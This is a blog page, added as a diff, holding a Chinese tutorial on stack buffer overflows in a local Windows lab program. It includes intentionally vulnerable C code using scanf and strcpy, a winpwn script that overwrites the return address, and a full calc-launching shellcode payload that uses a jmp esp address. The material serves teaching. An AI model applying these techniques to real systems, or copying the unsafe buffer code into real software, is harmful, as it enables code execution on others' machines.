@@ -1,0 +1,325 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>初探缓冲区溢出 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>初探缓冲区溢出</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/25
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E9%80%86%E5%90%91/" style="color: #03a9f4">
+                    逆向
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>缓冲区溢出是指当计算机程序向缓冲区内填充的数据位数超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上，我们使用精心设计的shellcode来覆盖合法的数据，从何使我们的shellcode得到执行。</p>
+<span id="more"></span>
+
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用vc++6.0</p>
+<p>关闭优化。</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps1.jpg" alt="img"> </p>
+<p>调试第三方程序需要设置仅为基本windows程序启用dep（默认即可），不然jmp esp会退出的。</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps2.jpg" alt="img"></p>
+<h2 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h2><p>漏洞代码：存在一个exp函数，但是main并没有调用</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+\#include &lt;windows.h&gt;
+
+
+
+void exp()&#123;
+
+​	system(&quot;calc&quot;);
+
+&#125;
+
+ 
+
+int main() &#123;
+
+​	char buf[4] = &quot;&quot;;
+
+​	scanf(&quot;%s&quot;, buf);
+
+​	return 0;
+
+&#125;
+</code></pre>
+<p>ida定位main函数</p>
+<p>00401364</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps3.jpg" alt="img"> </p>
+<p>OD在main函数下断点</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps4.jpg" alt="img"> </p>
+<p>运行起来到main函数断下来，main函数下一个地址是00401369，进入main函数的时候会把这个地址入栈</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps5.jpg" alt="img"> </p>
+<p>可以看到main下一行的00401369入栈了，地址为0019FF34</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps6.jpg" alt="img"> </p>
+<p>继续往下运行到scanf，scanf接收到数据保存到buf，但是buf只允许输入4个字符，超出的字符会覆盖栈区。为了方便观察传递aaaabbbbccccdddd</p>
+<p>输入回车后栈区的0019FF34被覆盖掉了，63636363对应ascii为cccc,此时偏移量为8位(缓冲区4+EBP)</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps7.jpg" alt="img"> </p>
+<p>运行到ret，当前栈顶为0019FF34，也就是进入main函数压栈的那个地址，现在对应的地址为63636363</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps8.jpg" alt="img"> </p>
+<p>F8运行后跳转到63636363地址。</p>
+<p>由于地址不存在程序报错退出，这样可以造成一个拒绝服务攻击<img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps9.jpg" alt="img"></p>
+<p>由于代码有一个exp函数，可以把返回地址覆盖为exp函数的开头，导致exp函数被执行</p>
+<p>ida查找exp函数地址，401005</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps10.jpg" alt="img"> </p>
+<p>使用winpwn传递参数，AAAABBBB再加上exp函数地址</p>
+<pre><code class="python">import time
+
+from winpwn import *
+
+ 
+
+local = True
+
+debug = True
+
+ 
+
+if debug:
+
+  context.log_level = &#39;debug&#39;
+
+io = process(&#39;./Test1.exe&#39;)
+
+payload = &#39;AAAABBBB&#39;+p32(0x00401005)
+
+ 
+
+io.sendline(payload)
+
+try:
+
+  io.interactive()
+
+except EOFError:
+
+  print(&quot;程序可能已崩溃或未正确响应&quot;)
+</code></pre>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps11.jpg" alt="img"></p>
+<h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>栈覆盖返回地址并且ret后，ESP是返回地址的下一个地址，如果返回一个jmp esp的地址，他会跳转到栈区，并且栈区现在是可控的，这样就可以执行任意命令。</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps12.jpg" alt="img"> </p>
+<p>查找jmp esp地址</p>
+<p>使用user32.dll的jmp esp地址，待会儿也要在.C文件导入这个dll</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28429161/article/details/107477997">https://blog.csdn.net/qq_28429161/article/details/107477997</a></p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps13.jpg" alt="img"> </p>
+<p>下载Shellcode</p>
+<p>使用exploit-db网站的shellcode，下面这个是打开计算器的shellcode</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/48116">https://www.exploit-db.com/shellcodes/48116</a></p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps14.jpg" alt="img"> </p>
+<p>strcpy函数复制buff到buf，buf缓冲区是4个，如果输入过大的地址则会覆盖缓冲区</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+
+#include &lt;windows.h&gt;
+
+ 
+
+char buff[] = &quot;&quot;;
+
+
+int main() &#123;
+
+​	char buf[4];
+
+​	LoadLibrary(&quot;user32.dll&quot;);
+
+​	strcpy(buf,buff);
+
+​	printf(buf);
+
+​	return 0;
+
+&#125;
+</code></pre>
+<p>buf是4个字节填充即可，ebp也是填充即可，esp使用上面获取到的地址，shellcode使用exploit-db提供的。</p>
+<p>buf+ebp+esp+shellcode</p>
+<p>构造payload：</p>
+<p>char buff[] &#x3D; “\x64\x65\x66\x67\x68\x69\x70\x71\x0f\xa7\xe3\x75\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0”;</p>
+<p>运行后成功执行了机器码</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps15.jpg" alt="img"> </p>
+<p>od分析</p>
+<p>进入main函数，返回地址为0019FF34  00401329  </p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps16.jpg" alt="img"> </p>
+<p>执行完strcpy函数，返回地址被覆盖为jmp esp的地址，同时栈后面的数据也被覆盖为shellcode</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps17.jpg" alt="img"> </p>
+<p>ret后跳转到esp，esp指向返回地址后面的一个地址</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps18.jpg" alt="img"> </p>
+<p>运行后跳转到shellcode地址</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps19.jpg" alt="img"> </p>
+<p>执行到0019FFD7 弹出来计算器</p>
+<p><img src="/../imgs/%E5%88%9D%E6%8E%A2%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/wps20.jpg" alt="img"> </p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
